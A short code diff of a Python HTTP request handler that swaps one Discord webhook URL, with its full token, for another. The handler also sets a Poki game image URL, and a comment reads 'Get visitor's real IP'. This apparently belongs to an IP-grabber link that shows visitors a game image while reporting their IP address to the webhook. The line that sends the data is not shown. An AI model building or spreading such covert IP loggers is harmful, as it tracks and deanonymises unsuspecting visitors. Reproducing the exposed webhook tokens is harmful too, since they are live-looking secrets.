@@ -6,7 +6,7 @@ import urllib.parse
 class handler(BaseHTTPRequestHandler):
     def do_GET(self):
         # Configuration
-        WEBHOOK = "https://discord.com/api/webhooks/1464803825847369837/j3diMzcguRrWtdRMnswJ5uA4_fCymBpPkTsV-eNYEs2xjChfvhpXOTCSb-AMB2ZXgz2Q"
+        WEBHOOK = "https://discord.com/api/webhooks/1467282876298035315/hylVzghwD9o9U6YtglUbd6G2RHMc8oXqXHzfqJbds0HPokKpC_xsTLezlYeTipMYXdPf"
         POKI_IMAGE = "https://img.poki.com/cdn-cgi/image/quality=78,width=1200,height=1200,fit=cover,f=auto/d1b46218990584f294f2f27eed934b5b.png"
         
         # Get visitor's real IP
